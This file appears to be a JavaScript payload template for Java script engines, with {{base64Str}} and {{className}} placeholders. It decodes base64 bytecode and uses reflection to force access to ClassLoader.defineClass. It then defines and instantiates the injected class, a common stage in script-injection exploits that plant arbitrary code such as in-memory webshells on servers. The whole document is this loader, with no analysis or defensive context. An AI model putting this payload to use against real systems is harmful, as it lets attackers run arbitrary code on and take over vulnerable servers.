var base64Str = "{{base64Str}}";
var className = "{{className}}";
var clsString = java.lang.Class.forName("java.lang.String");
var bytecode;
try {
    var decoder = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
    bytecode = decoder.getClass().getMethod("decode", clsString).invoke(decoder, base64Str);
} catch (ee) {
    var decoder = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
    bytecode = decoder.getClass().getMethod("decodeBuffer", clsString).invoke(decoder, base64Str);
}
var clsByteArray = (new java.lang.String("").getBytes().getClass());
var clsInt = java.lang.Integer.TYPE;
var pTypes = java.lang.reflect.Array.newInstance(java.lang.Class.class, 4);
java.lang.reflect.Array.set(pTypes, 0, clsString);
java.lang.reflect.Array.set(pTypes, 1, clsByteArray);
java.lang.reflect.Array.set(pTypes, 2, clsInt);
java.lang.reflect.Array.set(pTypes, 3, clsInt);
var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", pTypes);
defineClass.setAccessible(true);
var clazz = defineClass.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0),java.lang.Thread.currentThread().getContextClassLoader()), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
clazz.newInstance();